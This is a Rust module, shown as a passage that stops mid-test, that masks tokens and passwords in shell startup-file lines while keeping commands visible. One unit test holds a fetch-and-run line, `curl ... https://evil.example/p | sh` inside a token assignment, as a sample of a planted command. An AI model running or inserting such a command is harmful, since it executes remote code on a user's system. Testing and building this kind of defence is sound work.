//! Masking the secrets in a startup file's lines, so its tokens never reach the bundle while
//! every command in it does.
//!
//! Each physical line is copied as it is, with two kinds of word replaced by `(hidden)`:
//!
//! - a word shaped like a secret ([`secret_shaped`]): a known token format (`ghp_`, `sk-`,
//!   `AKIA`, a JWT, ...), a long high-entropy string, or 32 hex digits or more. A part of 40
//!   or 64 hex digits after a `/` in a URL, or after `sha1:`, `sha256:` or `at:`, is a git
//!   commit or a digest and is shown ([`mask_parts`]);
//! - the value of an assignment, option, header or JSON key whose name says it is secret
//!   ([`secret_name`]): `GITHUB_TOKEN=x`, `export DB_PASSWORD="x"`, `--api-key=x`,
//!   `--token x`, `launchctl setenv API_KEY x`, a crontab's `API_TOKEN = x`,
//!   `"Authorization: Bearer x"` and `{"password":"x"}`. Only the literal is masked: the text
//!   inside its quotes, a header's credential after its scheme, the default in `${T:-x}`. Not
//!   masked by its name: a literal that would hold a shell operator ([`OPERATORS`]: `;`, `|`,
//!   `&`, `<`, `>`, a parenthesis, a backquote) or an [`UNSAFE`] character (white space, a
//!   backslash, `$` (so a reference to another variable, `$TMPDIR/agent.sock`), a brace, a
//!   glob character, a quote); a path (`/`, `~/`, `./`); and anything on a line that holds the
//!   word `alias` ([`holds_alias`]), whose body is code. The word rules still mask a token
//!   inside any of them;
//! - the password in a URL (`postgres://app:x@db`), and a token as its user
//!   (`https://<token>@github.com`).
//!
//! The invariant that keeps a line's commands visible: a value masked by its name never holds
//! a shell operator, white space, a backslash or a `$` ([`OPERATORS`], [`UNSAFE`]), and a
//! masked word holds none of these by construction. So masked text is never a command with
//! arguments, nor an operator, a redirection or an expansion, even when a quote left open on
//! an earlier line makes the shell read it as code. Left: such a quote could make one masked
//! word the name of a command with no arguments; the agent is told to report a file whose
//! quotes do not balance.
//!
//! No shell is parsed, and nothing carries from one line to the next (owner's decision,
//! 2026-11-18), except that a line continued by a trailing backslash has only its
//! secret-shaped words masked, since it may be an alias's body; that carry can only show
//! more. The first design hid the value of every assignment, which needs a shell lexer;
//! five reviews in a row found lines where it read the shell differently from zsh or bash, and
//! each difference either leaked a token into the bundle or let a planted line (`# TOKEN="`)
//! hide a later command from the agent. Masking cannot hide a line, nor a command with its
//! arguments (see the invariant above).
//!
//! Accepted downsides, each shown: a value under a secret name whose literal holds white space,
//! a `$`, a backslash, a brace, a glob character (`~` included), a quote or an operator
//! (`AUTH="Bearer abc def"`, `PASSWORD='hunter$2'`, `DB_PASS=~x`, `TOKEN='abc'def`,
//! `"Cookie: a=1; session=x"`), unless a word of it looks like a secret; a short password under
//! an innocent name (`DB=hunter2`) or passed as a bare argument (`mysql -phunter2`,
//! `sshpass -p hunter2`); a key split over lines whose lines are short; and a capability URL
//! whose secret is a UUID (`hc-ping.com/<uuid>`), since UUIDs name too many harmless things to
//! mask by shape.

/// What replaces a masked word.
const HIDDEN: &str = "(hidden)";

/// The prefixes of token formats that providers publish, each followed by enough characters to
/// be a token, not a mention: GitHub, GitLab, Slack, OpenAI and Anthropic, Stripe, AWS access
/// key ids, Google API keys and OAuth access tokens, npm, PyPI, Hugging Face, Digital Ocean,
/// Send Grid, Shopify. The rest must hold a digit or an upper-case letter, as generated tokens
/// do, so a variable name such as `npm_config_script_shell` is not one.
const TOKEN_PREFIXES: [&str; 28] = [
    "ghp_",
    "gho_",
    "ghu_",
    "ghs_",
    "ghr_",
    "github_pat_",
    "glpat-",
    "xoxb-",
    "xoxp-",
    "xoxa-",
    "xoxs-",
    "xapp-",
    "sk-",
    "sk_live_",
    "rk_live_",
    "AKIA",
    "ASIA",
    "AIza",
    "npm_",
    "pypi-",
    "hf_",
    "ya29.",
    "xoxe.",
    "xoxe-",
    "dop_v1_",
    "SG.",
    "shpat_",
    "shpss_",
];

/// The segments of a name (split at `_` and `-`) that say its value is secret, matched in
/// upper case. A whole segment, so `GIT_AUTHOR_NAME` is shown; a segment may also end in one
/// of [`SECRET_ENDINGS`] (`_authToken`, `APIKEY`). See [`secret_name`] for the rest.
const SECRET_WORDS: [&str; 13] = [
    "TOKEN",
    "SECRET",
    "PASSWORD",
    "PASSWD",
    "PASSPHRASE",
    "PASS",
    "PWD",
    "PW",
    "COOKIE",
    "AUTH",
    "AUTHORIZATION",
    "CREDENTIAL",
    "KEY",
];

/// Endings of a name segment that say its value is secret (`AUTHTOKEN`, `CLIENTSECRET`,
/// `secretKey`, `SSHPASS`). `PASS` also ends `BYPASS`, which then masks a harmless value: only
/// over-masking, and the operator rule keeps commands visible.
const SECRET_ENDINGS: [&str; 9] = [
    "TOKEN",
    "SECRET",
    "PASSWORD",
    "PASS",
    "PASSPHRASE",
    "APIKEY",
    "SECRETKEY",
    "PRIVATEKEY",
    "ACCESSKEY",
];

/// The shortest word the entropy rule masks. Arbitrary but conventional: generated tokens are
/// 20 characters and more, and a shorter rule masks ordinary words and paths.
const MIN_RANDOM_LEN: usize = 20;

/// The characters through which a shell runs or redirects something: a list or pipe (`;`,
/// `&`, `|`), a command or process substitution (`` ` ``, `$(`, `<(`, `>(`, zsh's `=(`), a glob
/// qualifier (`*(e:...)`), and a redirection (`>`, `<`). A masked run never holds one (module
/// docs). The newline is not among them: a line has none.
const OPERATORS: [char; 8] = ['`', ';', '|', '&', '<', '>', '(', ')'];

/// Characters a value masked by its name may not hold besides [`OPERATORS`]: white space
/// (a command and its arguments), a backslash (it can turn a quote into a literal, so a
/// string the scan sees is code to the shell), `$` (an expansion the shell splits), braces
/// (`{TOKEN=x,echo,ran}` expands to a command and its arguments), glob characters, zsh's
/// extended ones included (`^`, `#`, `~`: an expansion to file names), and quotes (so the
/// shown line keeps every quote of the file, and the agent can judge whether they balance).
const UNSAFE: [char; 15] = [
    ' ', '\t', '\\', '$', '{', '}', '*', '?', '[', ']', '^', '#', '~', '\'', '"',
];

/// The bytes between words. A word may hold `/`, `:`, `@`, `.`, `+`, `-` and `%`, so a URL, an
/// AWS secret or a JWT is one word.
const BREAK: &[u8] = b" \t'\"`=;&|<>(){}[],$#\\";

/// The lines of `text`, secrets masked, one for each physical line.
pub(super) fn lines(text: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut names = Names::Masked;
    for line in text.lines() {
        out.push(mask(line, names));
        // A line ending in an odd number of backslashes goes on to the next, which may be the
        // body of an alias named above (`alias ll=ls \`), so its values are masked by shape
        // only. The one bit carried can only show more, never hide a line.
        let backslashes = line.bytes().rev().take_while(|&b| b == b'\\').count();
        names = if backslashes % 2 == 1 {
            Names::Shown
        } else {
            Names::Masked
        };
    }
    out
}

/// Whether a line's secret-named values are masked, or only its secret-shaped words.
#[derive(Debug, Clone, Copy)]
enum Names {
    Masked,
    /// A line that may define an alias ([`holds_alias`]), or one continued from the line
    /// above, whose command this line cannot see.
    Shown,
}

/// `line` with its secret-shaped words, and with `Names::Masked` the values of its
/// secret-named assignments and options, replaced by `(hidden)`.
fn mask(line: &str, names: Names) -> String {
    let names = if holds_alias(line) {
        Names::Shown
    } else {
        names
    };
    let by_name = |at| match names {
        Names::Masked => secret_value_at(line, at),
        Names::Shown => None,
    };
    let bytes = line.as_bytes();
    let mut out = String::with_capacity(line.len());
    let mut at = 0;
    while at < bytes.len() {
        if let Some(span) = by_name(at) {
            out.push_str(&line[at..span.value]);
            out.push_str(HIDDEN);
            at = span.end;
            continue;
        }
        if BREAK.contains(&bytes[at]) {
            out.push(char::from(bytes[at]));
            at += 1;
            continue;
        }
        let mut word_end = bytes[at..]
            .iter()
            .position(|b| BREAK.contains(b))
            .map_or(bytes.len(), |len| at + len);
        // A secret name inside the word, after `?`, `:` or `/` (`...?token=x`), ends it there,
        // so the next turn masks its value.
        if let Some(inner) =
            (at + 1..word_end).find(|&p| b"?:/".contains(&bytes[p - 1]) && by_name(p).is_some())
        {
            word_end = inner;
        }
        let word = &line[at..word_end];
        if secret_shaped(word) {
            out.push_str(HIDDEN);
        } else if word.len() > "pass:".len() && word.starts_with("pass:") {
            // openssl's `-passin pass:x`, a password in the word itself.
            out.push_str("pass:");
            out.push_str(HIDDEN);
        } else {
            out.push_str(&mask_parts(word));
        }
        at = word_end;
    }
    out
}

/// `word` with each part between `/`, `:` and `@` that looks like a secret masked
/// ([`secret_part`]), so a token in a URL (`https://u:ghp_x@github.com`) or a path is hidden
/// and the URL or path keeps its shape for the agent.
fn mask_parts(word: &str) -> String {
    if let Some((before, after)) = url_password(word) {
        return format!("{}{HIDDEN}{}", mask_parts(before), mask_parts(after));
    }
    let url = word.contains("://");
    let mut out = String::with_capacity(word.len());
    let mut start = 0;
    let mut before: Option<(char, &str)> = None;
    let separators = word
        .char_indices()
        .filter(|(_, c)| matches!(c, '/' | ':' | '@'))
        .map(|(at, c)| (at, Some(c)))
        .chain(std::iter::once((word.len(), None)));
    for (at, separator) in separators {
        let part = &word[start..at];
        // A pin: after a `/` in a URL, or after a `sha1:`, `sha256:` or `at:` label.
        let pinned = match before {
            Some(('/', _)) => url,
            Some((':', label)) => matches!(label, "sha1" | "sha256" | "at"),
            _ => false,
        };
        out.push_str(if secret_part(part, pinned) {
            HIDDEN
        } else {
            part
        });
        if let Some(separator) = separator {
            out.push(separator);
            before = Some((separator, part));
            start = at + separator.len_utf8();
        }
    }
    out
}

/// A URL's text before and after the secret in its user part, when it has one: the password
/// in `scheme://user:password@`, or a token as the user (`https://<token>@github.com`). A port
/// before a path holding `@` (`localhost:3000/@vite`) is not a password.
fn url_password(word: &str) -> Option<(&str, &str)> {
    let start = word.find("://")? + 3;
    let at = start + word[start..].find('@')?;
    if let Some(colon) = word[start..at].find(':') {
        let colon = start + colon;
        let secret = &word[colon + 1..at];
        // `host:3000/@path`: digits up to a `/` are a port, and the `@` is the path's.
        let port = secret.split_once('/').is_some_and(|(digits, _)| {
            !digits.is_empty() && digits.bytes().all(|b| b.is_ascii_digit())
        });
        (!secret.is_empty() && !port).then(|| (&word[..=colon], &word[at..]))
    } else {
        let user = &word[start..at];
        let token = !user.contains('/') && secret_shaped(user);
        token.then(|| (&word[..start], &word[at..]))
    }
}

/// Whether `text` is all hex digits.
fn hex(text: &str) -> bool {
    text.bytes().all(|b| b.is_ascii_hexdigit())
}

/// How a secret value ends, by the form its name was found in.
#[derive(Debug, Clone, Copy)]
enum Form {
    /// A shell word ([`word_len`]).
    Word,
    /// A header inside quotes, which ends at this quote.
    Header(u8),
    /// A JSON value.
    Json,
}

/// Where a secret value starts and ends.
#[derive(Debug)]
struct Span {
    value: usize,
    end: usize,
}

/// The value of a secret-named assignment, option, header or JSON key that starts at byte
/// `at`, which must start a word or follow `?`, `:` or `/`: `NAME=value` or `NAME+=value`
/// (after `export` and the like, or anywhere on the line), `NAME = value` at the start of a
/// line (a crontab's), `--name=value`, `--name value`, `launchctl setenv NAME value`,
/// `"Name: value"` (a header, inside quotes only, ending at its quote), or `"name":"value"`
/// (JSON). Otherwise the value is a shell word ([`word_len`]), narrowed to its literal
/// ([`narrow`]). A literal that would hold an operator or an [`UNSAFE`] character, and a path,
/// give `None` (see the module docs).
fn secret_value_at(line: &str, at: usize) -> Option<Span> {
    let bytes = line.as_bytes();
    // A name also starts after `?`, `:` or `/`: a query (`?token=x`) or npm's
    // `//registry/:_authToken=x`.
    if at > 0 && !BREAK.contains(&bytes[at - 1]) && !b"?:/".contains(&bytes[at - 1]) {
        return None;
    }
    let dashes = line[at..].len() - line[at..].trim_start_matches('-').len();
    let name_at = at + dashes;
    let name_len = line[name_at..]
        .find(|c: char| !(c.is_ascii_alphanumeric() || c == '_' || c == '-'))
        .unwrap_or(line.len() - name_at);
    let name = &line[name_at..name_at + name_len];
    if !secret_name(name) {
        return None;
    }
    let after = &line[name_at + name_len..];
    let line_start = line[..at].trim().is_empty();
    let spaced = after.trim_start_matches([' ', '\t']);
    // A name inside quotes: a header (`"Authorization: Bearer x"`), whose value runs to that
    // quote, or a JSON key (`{"password":"x"}`), whose value follows the closing quote.
    let quote = at
        .checked_sub(1)
        .map(|b| bytes[b])
        .filter(|b| matches!(b, b'"' | b'\''));
    let json = quote.and_then(|q| after.strip_prefix(char::from(q))?.strip_prefix(':'));
    let (separator, form) = if let Some(rest) = after.strip_prefix("+=") {
        (line.len() - rest.len(), Form::Word)
    } else if let Some(rest) = after.strip_prefix('=') {
        (line.len() - rest.len(), Form::Word)
    } else if let Some(rest) = spaced.strip_prefix('=').filter(|_| line_start) {
        let rest = rest.trim_start_matches([' ', '\t']);
        (line.len() - rest.len(), Form::Word)
    } else if let (Some(q), Some(rest)) = (quote, after.strip_prefix(':')) {
        let rest = rest.trim_start_matches([' ', '\t']);
        (line.len() - rest.len(), Form::Header(q))
    } else if let Some(rest) = json {
        let rest = rest.trim_start_matches([' ', '\t']);
        (line.len() - rest.len(), Form::Json)
    } else if dashes > 0 || line[..at].trim_end().ends_with("setenv") {
        // `--token x` and `launchctl setenv TOKEN x`: the next word is the value, unless it is
        // another option or an operator (`--password-stdin -u me`).
        let none = spaced.len() == after.len() || spaced.is_empty();
        if none || spaced.starts_with(['-', '<', '>', '|']) {
            return None;
        }
        (line.len() - spaced.len(), Form::Word)
    } else {
        return None;
    };
    let value = &line[separator..];
    let len = match form {
        // Never past the header's own quote, so the rest of the line stays as written.
        Form::Header(q) => value.find(char::from(q)).unwrap_or(value.len()),
        // A JSON value: its quoted string, or a bare one up to `,` or `}`.
        Form::Json => match value.strip_prefix('"') {
            Some(inner) => inner.find('"').map_or(value.len(), |end| end + 2),
            None => value.find([',', '}', ' ']).unwrap_or(value.len()),
        },
        Form::Word => word_len(value),
    };
    // The invariant (module docs): a masked run never holds a shell operator, white space, a
    // backslash or a `$`. With one, masked text could be code: a command and its arguments, or
    // text a quote opened on an earlier line, or a backslash, turns into a command. The whole
    // value is checked first, so no narrowing below can step past an operator.
    if value[..len].contains(OPERATORS) {
        return None;
    }
    let (separator, len) = narrow(form, &line[separator..separator + len])
        .map(|(skip, len)| (separator + skip, len))?;
    // A path holds no secret of its own and may say what runs. A reference to another
    // variable (`$TMPDIR/agent.sock`) is refused by `UNSAFE`, which holds `$`.
    let shown = &line[separator..separator + len];
    // `~` is in `UNSAFE`, so a path from home is refused there.
    let path = shown.starts_with('/') || ["./", "../"].iter().any(|p| shown.starts_with(p));
    if shown.is_empty() || shown.contains(UNSAFE) || path {
        return None;
    }
    Some(Span {
        value: separator,
        end: separator + len,
    })
}

/// The part of a secret value to mask, as where it starts in `value` and its length: a header's
/// credential after its scheme (`Bearer x`), the default in `${NAME:-x}` (or `:=`, `-`, `=`),
/// the text inside `'x'`, `"x"`, `$'x'` or `$"x"`, and otherwise the whole value. These leave
/// out text that holds a `$`, a space or a quote by its form alone, and the part left is
/// checked as any value is.
fn narrow(form: Form, value: &str) -> Option<(usize, usize)> {
    if let Form::Header(_) = form
        && let Some((_, credential)) = value.split_once(' ')
    {
        return Some((value.len() - credential.len(), credential.len()));
    }
    // A quoted value masks the text inside its quotes, which stay shown; an unclosed one masks
    // the text after its opening quote.
    for opener in ["$'", "$\"", "'", "\""] {
        if let Some(inner) = value.strip_prefix(opener) {
            let close = &opener[opener.len() - 1..];
            let literal = inner.strip_suffix(close).unwrap_or(inner);
            return Some((opener.len(), literal.len()));
        }
    }
    if let Some(inner) = value.strip_prefix("${").and_then(|v| v.strip_suffix('}')) {
        let name_len = inner
            .find(|c: char| !(c.is_ascii_alphanumeric() || c == '_'))
            .unwrap_or(inner.len());
        let rest = &inner[name_len..];
        let operator = [":-", ":=", "-", "="]
            .into_iter()
            .find(|op| rest.starts_with(op))?;
        let default = &rest[operator.len()..];
        return Some((value.len() - 1 - default.len(), default.len()));
    }
    Some((0, value.len()))
}

/// Whether `line` holds the word `alias` anywhere, however quoted or escaped (`\alias`,
/// `'al'ias`, `$'alias'`, `eval 'alias ...'`). Such a line may define an alias, whose body is
/// code that runs when its name is typed, so nothing on it is masked by name. Deciding which
/// names an alias defines needs the shell's quoting rules, and three reviews in a row found a
/// quoting this module read differently (`alias 'pass=x'`, `then alias`, `eval '...'`); a scan
/// of the prefix for every name also cost time quadratic in the line's length. The downside
/// accepted: a short secret on a line that also defines an alias is shown.
fn holds_alias(line: &str) -> bool {
    line.replace(['\\', '\'', '"'], "")
        .split(|c: char| !(c.is_ascii_alphanumeric() || c == '_'))
        .any(|word| word == "alias")
}

/// The length of the shell word `value` starts with: unquoted runs and quoted parts (`'...'`,
/// `"..."`, `$'...'`, `$"..."`) joined, up to white space, `;`, `&` or `|`. A quote that opens
/// the value and does not close runs to the end of the line, where the operator invariant
/// (module docs) still applies; one that does not close after other text is the closing quote
/// of a string around the assignment (`"...?token=x"`), and the word ends before it.
fn word_len(value: &str) -> usize {
    let mut len = 0;
    loop {
        let rest = &value[len..];
        let quoted = match rest.as_bytes() {
            [b'$', q @ (b'\'' | b'"'), ..] => Some((2, char::from(*q))),
            [q @ (b'\'' | b'"'), ..] => Some((1, char::from(*q))),
            _ => None,
        };
        if let Some((opener, q)) = quoted {
            match rest[opener..].find(q) {
                Some(end) => len += opener + end + 1,
                None if len == 0 => return value.len(),
                None => return len,
            }
            continue;
        }
        let end = rest
            .find([' ', '\t', ';', '&', '|', '"', '\''])
            .unwrap_or(rest.len());
        if end == 0 {
            return len;
        }
        len += end;
    }
}

/// Whether a name says its value is secret: one of its segments, split at `_` and `-`,
/// upper-cased and without trailing digits (`TOKEN2`), is one of [`SECRET_WORDS`] or ends in
/// one of [`SECRET_ENDINGS`], itself or without a plural `S` (`API_KEYS`). `ASKPASS`, which
/// ends in `PASS`, is excepted: it names the program sudo, ssh and git run for a password.
fn secret_name(name: &str) -> bool {
    name.split(['_', '-']).any(|segment| {
        // `GITHUB_TOKEN2` and `API_KEYS`: a numbered or plural secret is one too.
        let segment = segment
            .trim_end_matches(|c: char| c.is_ascii_digit())
            .to_ascii_uppercase();
        let singular = segment.strip_suffix('S').filter(|s| !s.is_empty());
        let secret = |segment: &str| {
            SECRET_WORDS.contains(&segment)
                || SECRET_ENDINGS
                    .iter()
                    .any(|ending| segment.ends_with(ending))
        };
        // `ASKPASS` names the program sudo, ssh and git run to ask for a password: shown.
        segment != "ASKPASS" && (secret(&segment) || singular.is_some_and(secret))
    })
}

/// Whether `word` as a whole looks like a secret: it starts with a published token prefix and
/// goes on for at least 16 more characters, is a Mailgun key, a JWT, 32 hex digits or more
/// (with or without `0x`: `openssl rand -hex 32` makes secrets so), an AWS secret access key
/// (40 characters of base64 with all three kinds), or a long random base64 body.
fn secret_shaped(word: &str) -> bool {
    let has_prefix = TOKEN_PREFIXES.iter().any(|prefix| {
        word.strip_prefix(prefix).is_some_and(|rest| {
            rest.len() >= 16
                && rest
                    .bytes()
                    .any(|b| b.is_ascii_digit() || b.is_ascii_uppercase())
        })
    });
    // Mailgun's keys: `key-` and 32 hex digits.
    let mailgun = word
        .strip_prefix("key-")
        .is_some_and(|rest| rest.len() == 32 && hex(rest));
    let jwt = word.starts_with("eyJ") && word.split('.').count() == 3 && word.len() >= 30;
    let digits = word.strip_prefix("0x").unwrap_or(word);
    let long_hex = digits.len() >= 32 && hex(digits);
    let aws_secret = word.len() == 40
        && word
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || b == b'/' || b == b'+')
        && all_kinds(word);
    // A key's base64 body (a PEM line, a session token): long, all three kinds, random. Not a
    // path, which starts with `/` or `~` and holds words, not noise.
    let base64 = word.len() >= 40
        && !word.starts_with(['/', '~'])
        && word
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'/' | b'+' | b'='))
        && all_kinds(word)
        && entropy(word) >= 4.0;
    has_prefix || mailgun || jwt || long_hex || aws_secret || base64
}

/// Whether a part of a word looks like a secret: as a whole word would ([`secret_shaped`]), or
/// random ([`random`]), unless it is a commit or digest where a pin goes (`pinned`).
fn secret_part(part: &str, pinned: bool) -> bool {
    // A git commit (40 hex digits) or a SHA-256 digest (64) where a pin goes ([`mask_parts`])
    // says what a line runs, which the agent needs: shown. Anywhere else, and at any other
    // length, hex is masked: a pin as its own word, or a 40-hex credential, cannot be told
    // from a key.
    let pin = pinned && matches!(part.len(), 40 | 64) && hex(part);
    !pin && (secret_shaped(part) || random(part))
}

/// Whether a part of a word reads as random: [`MIN_RANDOM_LEN`] characters or more, lower and
/// upper case and digits, no `.` (a file name or host name has one), and at least 3.5 bits of
/// entropy per character. The threshold is arbitrary, below base62 and base64 tokens (over 4
/// bits) and above a word repeated or a version string.
fn random(part: &str) -> bool {
    part.len() >= MIN_RANDOM_LEN && !part.contains('.') && all_kinds(part) && entropy(part) >= 3.5
}

/// Whether `word` holds a lower-case letter, an upper-case letter and a digit.
fn all_kinds(word: &str) -> bool {
    word.bytes().any(|b| b.is_ascii_lowercase())
        && word.bytes().any(|b| b.is_ascii_uppercase())
        && word.bytes().any(|b| b.is_ascii_digit())
}

/// The Shannon entropy of `word`'s bytes, in bits per byte.
fn entropy(word: &str) -> f64 {
    let mut counts = [0_u32; 256];
    for byte in word.bytes() {
        counts[usize::from(byte)] += 1;
    }
    #[expect(
        clippy::cast_precision_loss,
        reason = "a word is at most a line, far below 2^52 bytes"
    )]
    let len = word.len() as f64;
    counts
        .iter()
        .filter(|&&count| count > 0)
        .map(|&count| {
            let p = f64::from(count) / len;
            -p * p.log2()
        })
        .sum()
}

#[cfg(test)]
mod tests {
    use super::*;

    /// One line masked as a line of its own.
    fn mask(line: &str) -> String {
        super::mask(line, Names::Masked)
    }

    #[test]
    fn secret_shaped_words_are_masked_wherever_they_are() {
        let cases = [
            (
                "export GITHUB=ghp_0123456789abcdefABCDEF0123",
                "export GITHUB=(hidden)",
            ),
            (
                "gh auth login --with-token ghp_0123456789abcdefABCD",
                "gh auth login --with-token (hidden)",
            ),
            (
                "curl -H 'Authorization: Bearer sk-proj-abcdefghij0123456789'",
                "curl -H 'Authorization: Bearer (hidden)'",
            ),
            (
                "aws configure set aws_access_key_id AKIAIOSFODNN7EXAMPLE1",
                "aws configure set aws_access_key_id (hidden)",
            ),
            (
                "echo wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY > ~/.aws/x",
                "echo (hidden) > ~/.aws/x",
            ),
            (
                "X=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.abcDEF123ghiJKL456",
                "X=(hidden)",
            ),
            (
                "# old: xoxb-1234567890-0987654321-abcdefABCDEF",
                "# old: (hidden)",
            ),
            ("K=0123456789abcdef0123456789abcdef", "K=(hidden)"),
            (
                "//registry.npmjs.org/:_authToken=npm_abcdefghijklmnopqrstuvwxyz0123",
                "//registry.npmjs.org/:_authToken=(hidden)",
            ),
        ];
        for (line, shown) in cases {
            assert_eq!(mask(line), shown, "{line}");
        }
    }

    #[test]
    fn values_of_secret_names_are_masked() {
        let cases = [
            ("export DB_PASSWORD=hunter2", "export DB_PASSWORD=(hidden)"),
            (
                "export AUTH=\"Bearer abc def\" && echo ok",
                "export AUTH=\"Bearer abc def\" && echo ok",
            ),
            (
                "[ -n \"$CI\" ] || export MY_TOKEN=abc",
                "[ -n \"$CI\" ] || export MY_TOKEN=(hidden)",
            ),
            ("SECRET+=more", "SECRET+=(hidden)"),
            (
                "cli --api-key=abc --token xyz go",
                "cli --api-key=(hidden) --token (hidden) go",
            ),
            (
                "launchctl setenv NPM_TOKEN abc",
                "launchctl setenv NPM_TOKEN (hidden)",
            ),
            ("export PASS=\"unclosed", "export PASS=\"(hidden)"),
            // To the end of its line only: no line can hide the next.
            ("# TOKEN=\"", "# TOKEN=\""),
            (
                "git clone https://me:ghp_0123456789abcdefABCD@github.com/o/r",
                "git clone https://me:(hidden)@github.com/o/r",
            ),
            (
                "* * * * * GH_TOKEN=abc /usr/local/bin/b",
                "* * * * * GH_TOKEN=(hidden) /usr/local/bin/b",
            ),
        ];
        for (line, shown) in cases {
            assert_eq!(mask(line), shown, "{line}");
        }
    }

    #[test]
    fn values_that_run_or_point_somewhere_are_shown() {
        let cases = [
            // A value that runs a command shows the command; a path is shown.
            (
                "export GH_TOKEN=\"$(curl -fsSL https://evil.example/p | sh)\"",
                "export GH_TOKEN=\"$(curl -fsSL https://evil.example/p | sh)\"",
            ),
            (
                "export GITHUB_TOKEN=\"$(gh auth token)\"",
                "export GITHUB_TOKEN=\"$(gh auth token)\"",
            ),
            (
                "export SUDO_ASKPASS=/tmp/.x/askpass",
                "export SUDO_ASKPASS=/tmp/.x/askpass",
            ),
            (
                "export SSH_AUTH_SOCK=~/.ssh/agent.sock",
                "export SSH_AUTH_SOCK=~/.ssh/agent.sock",
            ),
            ("export GIT_AUTHOR_NAME=me", "export GIT_AUTHOR_NAME=me"),
            ("export KEYTIMEOUT=1", "export KEYTIMEOUT=1"),
            // `KEY` as a segment, and endings.
            ("export OPENAI_KEY=abcdefghij", "export OPENAI_KEY=(hidden)"),
            (
                "PRIVATE_KEY=0x4c0883a69102937d6231471b5dbb6204fe5129617082792ae468d01a3f362318",
                "PRIVATE_KEY=(hidden)",
            ),
            // A URL's password.
            (
                "export DATABASE_URL=postgres://app:hunter2pass@db.internal:5432/app",
                "export DATABASE_URL=postgres://app:(hidden)@db.internal:5432/app",
            ),
            (
                "git clone https://me:s3cretpass@gitlab.example.com/o/r",
                "git clone https://me:(hidden)@gitlab.example.com/o/r",
            ),
            // A crontab's spaced form, and headers.
            ("API_TOKEN = abc123secret", "API_TOKEN = (hidden)"),
            ("API_TOKEN =abc123secret", "API_TOKEN =(hidden)"),
            (
                "curl -H \"X-Auth-Token: 1b4e28ba-2fa1-11d2-883f-00c04fd430c8\" https://x",
                "curl -H \"X-Auth-Token: (hidden)\" https://x",
            ),
            // A flag that takes no value keeps the next word.
            (
                "docker login --password-stdin -u me",
                "docker login --password-stdin -u me",
            ),
            (
                "tool --no-auth /usr/local/bin/run",
                "tool --no-auth /usr/local/bin/run",
            ),
            // A key's base64 body.
            (
                "VbfGbH+0c/X1ks9W1aB3dE5fG7hJ9kL1mN3pQ5rSt7uV9wX1yZ3",
                "(hidden)",
            ),
        ];
        for (line, shown) in cases {
            assert_eq!(mask(line), shown, "{line}");
        }
    }

    #[test]
    fn urls_headers_and_pins_mask_only_their_secrets() {
        let cases = [
            (
                concat!(
                    "export https_proxy=\"http://jdoe:aB3dE5fG7hJ9kL1mN3pQ",
                    "/s3cr3t@proxy.corp.example:8080\""
                ),
                "export https_proxy=\"http://jdoe:(hidden)@proxy.corp.example:8080\"",
            ),
            (
                "export DATABASE_URL=\"postgres://app:Correct.Horse.Battery1@db.internal/app\"",
                "export DATABASE_URL=\"postgres://app:(hidden)@db.internal/app\"",
            ),
            (
                concat!(
                    "*/5 * * * * curl -fsS \"https://ci.example.com",
                    "/nightly?token=7f3a9c2e1b8d4f6a0c5e\""
                ),
                "*/5 * * * * curl -fsS \"https://ci.example.com/nightly?token=(hidden)\"",
            ),
            (
                concat!(
                    "curl -H \"Authorization: Bearer",
                    " ya29.a0AfH6SMC7J8kLmNoPqRsTuVwXyZ0123456789\" https://x"
                ),
                "curl -H \"Authorization: Bearer (hidden)\" https://x",
            ),
            (
                "T=ya29.a0AfH6SMC7J8kLmNoPqRsTuVwXyZ0123456789",
                "T=(hidden)",
            ),
            (
                "export npm_config_script_shell=/bin/bash",
                "export npm_config_script_shell=/bin/bash",
            ),
            (
                "curl --anyauth https://example.com/install.sh | sh",
                "curl --anyauth https://example.com/install.sh | sh",
            ),
            (
                "ssh -o PubkeyAuthentication=yes git@github.com",
                "ssh -o PubkeyAuthentication=yes git@github.com",
            ),
            (
                "export GOOGLE_APPLICATION_CREDENTIALS=\"$HOME/.config/gcloud/adc.json\"",
                "export GOOGLE_APPLICATION_CREDENTIALS=\"$HOME/.config/gcloud/adc.json\"",
            ),
            // A commit or digest pins what runs: shown.
            (
                concat!(
                    "curl -fsSL https://raw.githubusercontent.com/nvm-sh/nvm",
                    "/87f121a2c7c684f357ad85a9cbe0c4ff3b1c9c86/install.sh | bash"
                ),
                concat!(
                    "curl -fsSL https://raw.githubusercontent.com/nvm-sh/nvm",
                    "/87f121a2c7c684f357ad85a9cbe0c4ff3b1c9c86/install.sh | bash"
                ),
            ),
            (
                "zinit ice ver\"87f121a2c7c684f357ad85a9cbe0c4ff3b1c9c86\" as\"program\"",
                "zinit ice ver\"(hidden)\" as\"program\"",
            ),
            (
                concat!(
                    "docker run",
                    " sha256:e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
                ),
                concat!(
                    "docker run",
                    " sha256:e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
                ),
            ),
            (
                "export GIT_AUTHOR_EMAIL=\"jane@example.com\"",
                "export GIT_AUTHOR_EMAIL=\"jane@example.com\"",
            ),
        ];
        for (line, shown) in cases {
            assert_eq!(mask(line), shown, "{line}");
        }

        // Built when the test runs, so the source holds no string GitHub's push protection
        // takes for a live npm or Mailgun key.
        let uuid = ["a1b2c3d4", "e5f6", "7890", "abcd", "ef1234567890"].join("-");
        let npmrc = format!("//registry.npmjs.org/:_authToken={uuid}");
        assert_eq!(mask(&npmrc), "//registry.npmjs.org/:_authToken=(hidden)");
        let mailgun = format!("key-{}", "0123456789abcdef".repeat(2));
        let curl = format!("curl -s --user \"api:{mailgun}\" https://api.mailgun.net");
        assert_eq!(
            mask(&curl),
            "curl -s --user \"api:(hidden)\" https://api.mailgun.net"
        );
    }

    #[test]
    fn json_keys_new_names_and_references() {
        let cases = [
            (
                "curl -d '{\"password\":\"hunter2pass\"}' https://x",
                "curl -d '{\"password\":\"(hidden)\"}' https://x",
            ),
            (
                "curl -d '{\"api_key\": \"abc123def456\"}' https://x",
                "curl -d '{\"api_key\": \"(hidden)\"}' https://x",
            ),
            ("BORG_PASSPHRASE=correct-horse", "BORG_PASSPHRASE=(hidden)"),
